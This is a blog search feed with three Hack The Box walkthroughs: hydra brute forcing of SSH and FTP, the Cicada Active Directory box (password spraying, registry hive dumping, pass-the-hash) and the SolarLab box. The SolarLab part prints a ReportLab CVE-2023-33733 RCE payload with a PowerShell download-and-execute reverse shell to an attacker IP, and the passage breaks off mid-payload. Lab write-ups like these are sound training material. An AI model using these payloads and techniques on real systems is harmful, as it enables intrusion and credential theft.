<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB Academy - Login Brute Forcing Skill Assessment II  Walkthrough</title>
      <link href="/2025/06/19/HTB%20Skill%20Assessment%20II%20Walkthrough/"/>
      <url>/2025/06/19/HTB%20Skill%20Assessment%20II%20Walkthrough/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://academy.hackthebox.com/storage/modules/57/logo.png" alt="htblogo"></h2><p> The assessment’s objective is to  brute force  both SSH &amp; FTP servers on the target.<br> we start by gathering the  username for the SSH server   from skill Assessment I’s solution, which I’m not allowed to spoil.<br>lets start by brute forcing that user’s SSH password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;2023-200_most_used_passwords.txt&gt; &lt;ip&gt; -s &lt;port&gt; ssh -t 3 -I</span><br></pre></td></tr></table></figure><p>SSH into target</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh &lt;user&gt;@83.136.253.201 -p &lt;port&gt;</span><br><span class="line">#prompt for pass:&lt;pass&gt;</span><br></pre></td></tr></table></figure><p>open incident report, There should be  a username hint<br><img src="/../images/bruting/namehint.png" alt="namehint"><br> use <code>username-anarchy</code> tool on the discovered user to generate a  list of possible ftp username combinations:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./username-anarchy/username-anarchy [FIRST] [LAST] &gt; tsmithNames.txt</span><br></pre></td></tr></table></figure><p>brute ftp with the newly generated username list and the provided password list on the target.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L &lt;unarchyLIST.txt&gt;.txt -P passwords.txt 127.0.0.1 ftp -t 3 -I</span><br></pre></td></tr></table></figure><p><img src="/../images/bruting/ftphydra.png" alt="ftphydra"><br>login to ftp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ftp ftp://&lt;USERNAME&gt;:&quot;&lt;PASS&gt;&quot;@localhost</span><br></pre></td></tr></table></figure><p>download the flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">ftp&gt; get flag.txt</span><br><span class="line">ftp&gt; exit</span><br><span class="line">sshSession$ cat flag.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> nmap </tag>
            
            <tag> bruteforcing </tag>
            
            <tag> brute </tag>
            
            <tag> hydra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Cicada  Walkthrough</title>
      <link href="/2025/01/22/HTB-Cicada/"/>
      <url>/2025/01/22/HTB-Cicada/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/../images/cicada.png" alt="alt text"></h2><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Cicada is easy Windows Active Directory box. it start off with enumerating SMB shares to find a new hire welcome note with a default password. RID-cycle to get a list of usernames, and spray that password to find a user still using it. With a valid user I can query LDAP to find another user with their password stored in their description. That user has access to a share with a dev script used for backup, and more creds. Those creds work to get a shell, and the user is in the Backup Operators group, so  exfil the registry hives and dump the machine hashes.</p> <span id="more"></span><hr><table><thead><tr><th>INFO</th><th></th></tr></thead><tbody><tr><td>CTF NAME</td><td><strong>Cicada</strong></td></tr><tr><td>Operating System</td><td><strong>Windows</strong></td></tr><tr><td>Diffculty</td><td><strong>Easy</strong></td></tr><tr><td>Retire date</td><td>21 Sep 2024</td></tr><tr><td>Points</td><td><strong>25</strong></td></tr></tbody></table><hr><h1 id="INFORMATION-GATHERING"><a href="#INFORMATION-GATHERING" class="headerlink" title="INFORMATION GATHERING"></a>INFORMATION GATHERING</h1><p>Information gathering reveals several ports open:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SMB 445</span><br><span class="line">RDP 3389</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><h1 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h1><h3 id="anonymous-access"><a href="#anonymous-access" class="headerlink" title="anonymous access"></a>anonymous access</h3><p>Checking smb port for anonymous access:<br><img src="/security/Screenshots/Pasted%20image%2020241216181737.png"></p><p>SMB Share enumeration unveils a notice from HR file inside the HR share, let’s check it out<br><img src="/security/Screenshots/Pasted%20image%2020241216182316.png"><br>note down the discovered default password: <code>Cicada$M6Corpb*@Lp#nZp!8</code></p><p>with anonymous access enabled to the smb server, we can try to discover users with <code>rid bruteforcing</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">oxdf@hacky$ netexec smb CICADA-DC -u guest -p &#x27;&#x27; --rid-brute</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeG</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>cleaning the  users list with grep</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat names |grep SidTypeUser| grep -oP &#x27;\\\K[^ ]+&#x27; &gt; users-list.txt</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">CICADA-DC$</span><br><span class="line">john.smoulder</span><br><span class="line">sarah.dantelia</span><br><span class="line">michael.wrightson</span><br><span class="line">david.orelious</span><br><span class="line">emily.oscars</span><br></pre></td></tr></table></figure><h5 id="checking-password-policy"><a href="#checking-password-policy" class="headerlink" title="checking password policy"></a>checking password policy</h5><p><img src="/security/Screenshots/Pasted%20image%2020241217023442.png">   </p><p> Now i’m going to run a spraying attack at smb with the curated list of users and the found default password:<br><img src="/security/Screenshots/Pasted%20image%2020241216182736.png"><br>Discovered: <code>michael.wrightson</code> user</p><h2 id="Credentialed-Smb-enumeration"><a href="#Credentialed-Smb-enumeration" class="headerlink" title="Credentialed Smb enumeration"></a>Credentialed Smb enumeration</h2><p>dumping all users:<br><img src="/security/Screenshots/Pasted%20image%2020241217024546.png"><br>it appears  david.orelious has left a gift for us, his Creds.<br><code>aRt$Lp#7t*VQ!3 </code><br><img src="/security/Screenshots/Pasted%20image%2020241217030335.png"><br>Authenticated as david reveals the DEV share</p><h2 id="DEV-SHARE-ENUMERATION"><a href="#DEV-SHARE-ENUMERATION" class="headerlink" title="DEV SHARE ENUMERATION"></a>DEV SHARE ENUMERATION</h2><p>throughly enumerate content of the DEV share With the spider module:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.11.35 -u &#x27;david.orelious&#x27; -p &#x27;aRt$Lp#7t*VQ!3&#x27; --spider DEV --regex .</span><br></pre></td></tr></table></figure><h2 id="Script-file-discovery"><a href="#Script-file-discovery" class="headerlink" title="Script file discovery"></a>Script file discovery</h2><p> Inspecting the output of spider, i found a script file with credentials of another user<br><img src="/security/Screenshots/Pasted%20image%2020241217032915.png"></p><p>i found a PS-Credential object with emily.oscars credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = &quot;emily.oscars&quot;</span><br><span class="line">$password = ConvertTo-SecureString &quot;Q!3@Lp#M6b*7t*Vt&quot; -AsPlainText -Force</span><br><span class="line">$credentials = New-Object System.Management.Automation.PSCredential($username, $password)</span><br></pre></td></tr></table></figure><p>test out  the credentials with evil-winrm:<br><img src="/security/Screenshots/Pasted%20image%2020241217034219.png"></p><h4 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag:"></a>user flag:</h4><p><img src="/security/Screenshots/Pasted%20image%2020241217034425.png"></p><h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><p>checking privileges</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">get-acl c:\users\administrator</span><br></pre></td></tr></table></figure><p><img src="/security/Screenshots/Pasted%20image%2020241217095700.png"></p><p>The <code>SeBackupPrivilege</code> can be used to gain read access to any file According to microsoft docs<br>there are many techniques avaiable to exploit this, but im going copy the hives registery manually using <code>reg</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; reg save hklm\sam sam      </span><br><span class="line">The operation completed successfully.                      </span><br><span class="line">                             </span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; reg save hklm\system system</span><br><span class="line">The operation completed successfully. </span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; download sam</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\programdata\sam to sam</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; download system</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\programdata\system to system</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure><p>now i’m going to extract the Administrator’s hash from the registery hives with <code>secretsdump.py</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -sam sam -system system LOCAL</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#x27;t have hash information.</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><h2 id="or-via-reg-py"><a href="#or-via-reg-py" class="headerlink" title="or via reg.py"></a>or via reg.py</h2><p>Impacket’s reg.py is a remote registry manipulation tool, providing similar functionality to reg.exe in Windows.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ reg.py &#x27;cicada.htb/emily.oscars:Q!3@Lp#M6b*7t*Vt&#x27;@10.10.11.35 backup -o &#x27;C:\windows\temp\&#x27;</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...</span><br><span class="line">[*] Saved HKLM\SAM to C:\windows\temp\\SAM.save</span><br><span class="line">[*] Saved HKLM\SYSTEM to C:\windows\temp\\SYSTEM.save</span><br><span class="line">[*] Saved HKLM\SECURITY to C:\windows\temp\\SECURITY.save</span><br></pre></td></tr></table></figure><p>And then Download them over EvilWinRM:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; download SYSTEM.save</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\windows\temp\SYSTEM.save to SYSTEM.save</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; download SAM.save</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\windows\temp\SAM.save to SAM.save</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; download SECURITY.save</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\windows\temp\SECURITY.save to SECURITY.save</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure><h1 id="testing-the-hash"><a href="#testing-the-hash" class="headerlink" title="testing the hash"></a>testing the hash</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb CICADA-DC -u administrator -H aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><br></pre></td></tr></table></figure><p>get the flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt</span><br><span class="line">b7cd8************************</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> nmap </tag>
            
            <tag> HTB </tag>
            
            <tag> smb </tag>
            
            <tag> windows </tag>
            
            <tag> flask </tag>
            
            <tag> privilege escalation </tag>
            
            <tag> openfire </tag>
            
            <tag> chisel </tag>
            
            <tag> password-spray </tag>
            
            <tag> htb Cicada </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox SolarLab  Walkthrough</title>
      <link href="/2024/09/22/HTB-SolarLab/"/>
      <url>/2024/09/22/HTB-SolarLab/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/solarlab/blacksolar.png" alt="alt text"></p><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>SolarLab begins with an SMB share containing a spreadsheet of usernames and passwords. By exploiting a website that displays distinct error messages for incorrect usernames versus wrong passwords, combined with analyzing the username format, I was able to identify valid credentials.</p><p> Once logged in, I leveraged CVE-2023-33733 in the reportlab PDF generation process to achieve Remote Code Execution (RCE) and obtain a shell.</p><p>For lateral movement,  to escalate privileges to the openfire user,  method takes advantage of CVE-2023-32315 in OpenFire to create a user and upload a malicious plugin for RCE.<br> With this access, I decrypted a password from the OpenFire configuration, which  served as the administrator’s password. </p> <span id="more"></span><hr><table><thead><tr><th>INFO</th><th></th></tr></thead><tbody><tr><td>CTF NAME</td><td><strong>SolarLab</strong></td></tr><tr><td>Operating System</td><td><strong>Windows</strong></td></tr><tr><td>Diffculty</td><td><strong>Medium</strong></td></tr><tr><td>Retire date</td><td>21 Sep 2024</td></tr><tr><td>Points</td><td><strong>35</strong></td></tr></tbody></table><hr><h1 id="INFORMATION-GATHERING"><a href="#INFORMATION-GATHERING" class="headerlink" title="INFORMATION GATHERING"></a>INFORMATION GATHERING</h1><p>Initial nmap scan with default scripts</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sV  -oN nmap/solarlab_full 10.10.11.16 -p-</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-16 14:54 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.16</span><br><span class="line">Host is up (0.094s latency).</span><br><span class="line">Not shown: 65529 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">6791/tcp open  hnm</span><br><span class="line">7680/tcp open  pando-pub</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-05-17T18:56:05</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.15 seconds</span><br></pre></td></tr></table></figure><p>Fingerprinting OS using smbmap would indicate the machine is a windows server 2019.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H solarlab.htb -v</span><br></pre></td></tr></table></figure><h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><p>Enumerating the discovered SMB service, there was one share with a document file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smb -H 10.10.11.16 -s Documents -u guest -r</span><br><span class="line">[+]                                                   </span><br><span class="line">        Documents                                               READ ONLY</span><br><span class="line">        fr--r--r--            12793 Fri Nov 17 07:34:54 2023    details-file.xlsx</span><br><span class="line">-----------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>download the  file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap  -H 10.10.11.16 -s Documents -u guest -p &quot;&quot; -r -A  details-file.xlsx  </span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/image-1.png" alt="alt text"><br> it was clear that these were some login credentials related to a domain</p><p>Nothing else was discovered on SMB. its time to enumerate port 80.</p><h2 id="Enumerating-Port-80"><a href="#Enumerating-Port-80" class="headerlink" title="Enumerating  Port 80"></a>Enumerating  Port 80</h2><p>The default root appeared to be a static site with nothing interesting, so I started looking at other open ports and discovered a subdomain running on port 6791:<br><code>http://report.solarlab.htb:6971</code><br><img src="/../images/solarlab/report-lab.png" alt="alt text"><br>I initially started by identifying which users from the spreadsheet existed. Testing h usernames like “blake.byte” or “blake byte” produced a different error messages from “claudiaS” or “alexanderK”, confirming that Alex and Claudia exist but the passwords were incorrect.</p><h3 id="bruteforcing-with-intruder"><a href="#bruteforcing-with-intruder" class="headerlink" title="bruteforcing with intruder"></a>bruteforcing with intruder</h3><p>I attempted bruteforcing in Clusterbomb attack mode, trying different combinations from the spreadsheet file.<br><img src="/../images/solarlab/intruder.png" alt="alt text"><br>No valid credentials, I returned to the document and observed a pattern in the naming convention. Two users had shortened names, e.g., ClaudiaS and AlexanderK. The third user, Blake Byte, could follow the same pattern.<br>Trying the same brute attack with “blakeB” as the login username worked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* PASS: ThisCanB3typedeasily1@</span><br><span class="line">* USER: blakeb</span><br></pre></td></tr></table></figure><h2 id="Enumerating-Reporthub"><a href="#Enumerating-Reporthub" class="headerlink" title="Enumerating Reporthub"></a>Enumerating Reporthub</h2><p>This site offers some functionality, and the “Training Request” section leads to a form.<br><img src="/../images/solarlab/reporthub.webp" alt="asas"></p><p><img src="/../images/solarlab/form.png" alt="alt text"><br>After clicking the “Generate PDF” button, I was redirected to a PDF document. The image gets reflected in the PDF, indicating a possible XSS vulnerability.<br><img src="/../images/solarlab/signature.png" alt="alt text"><br>I tried simple payloads to test for injection, uploading script files with .html and .svg formats, but no luck. I then downloaded the PDF document and ran exiftool on it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exiftool output.pdf </span><br><span class="line">ExifTool Version Number         : 12.40</span><br><span class="line">File Name                       : output.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 202 KiB</span><br><span class="line">File Modification Date/Time     : 2024:09:12 15:54:21-04:00</span><br><span class="line">File Access Date/Time           : 2024:09:12 15:54:22-04:00</span><br><span class="line">File Inode Change Date/Time     : 2024:09:12 15:54:21-04:00</span><br><span class="line">File Permissions                : -rwxrwx---</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application/pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Author                          : (anonymous)</span><br><span class="line">Create Date                     : 2024:05:17 22:53:02-02:00</span><br><span class="line">Creator                         : (unspecified)</span><br><span class="line">Modify Date                     : 2024:05:17 22:53:02-02:00</span><br><span class="line">Producer                        : ReportLab PDF Library - www.reportlab.com</span><br><span class="line">Subject                         : (unspecified)</span><br><span class="line">Title                           : (anonymous)</span><br><span class="line">Trapped                         : False</span><br><span class="line">Page Mode                       : UseNone</span><br><span class="line">Page Count                      : 1</span><br></pre></td></tr></table></figure><p>The library used to make it is ReportLab.</p><p>Searching for “reportlab exploit” turns up information about CVE-2023-33733, a remote code execution vulnerability through Injection in ReportLab:<br><img src="/../images/solarlab/cve.png" alt="alt text"></p><h2 id="Exploiting-ReportLab"><a href="#Exploiting-ReportLab" class="headerlink" title="Exploiting ReportLab"></a>Exploiting ReportLab</h2><p>Navigating to the exploit PoC on GitHub, the exploit code was:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))</span></span></span><br><span class="line"><span class="string"><span class="tag">[&#x27;os&#x27;].system(&#x27;ping #attacker-ip&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1,</span></span></span><br><span class="line"><span class="string"><span class="tag"> &#x27;startswith&#x27;: lambda self,</span></span></span><br><span class="line"><span class="string"><span class="tag">  x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/form.png" alt="alt text"></p><p>Attempting to send the exploit through the form field<br>throws an error in your face indicating that the character limit for the form was exceeded.</p><p>one way to solve this would be to try and shorten the length of every variable, or to try different parameters<br>after intercepting with burp and trying different areas,<br>placing the exploit under <code>training_request</code> Drop list option bypasses this restriction.<br><img src="/../images/solarlab/burp.png" alt="alt text"></p><h2 id="Blake-shell"><a href="#Blake-shell" class="headerlink" title="Blake shell"></a>Blake shell</h2><p>after confirming the connection it’s time to get a shell!<br>this part involves these steps:</p><ul><li>setup python server hosting the shell:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 http.server 80   <span class="comment">#revshell.ps1 is in the same directory</span></span><br></pre></td></tr></table></figure><ul><li>set up a listening session on a separate tab:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; (<span class="built_in">stty</span> size; <span class="built_in">cat</span>) | nc -lvnp PORT</span><br></pre></td></tr></table></figure><ul><li>This Piece of code is used to download and execute powershell script in memory, were going to add it to the Exploit Code</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span>(<span class="built_in">IWR</span> http://<span class="number">10.10</span>.<span class="number">16.14</span>/con.ps1 <span class="literal">-UseBasicParsing</span>); <span class="built_in">Invoke-ConPtyShell</span> <span class="number">10.10</span>.<span class="number">16.63</span> <span class="number">9001</span></span><br></pre></td></tr></table></figure><h4 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit:"></a>Final Exploit:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))</span></span></span><br><span class="line"><span class="string"><span class="tag">[&#x27;os&#x27;].system(&#x27;powershell IEX(IWR http://10.10.16.14/con.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.16.63 9001&#x27;) for Word in [ orgTypeFun( 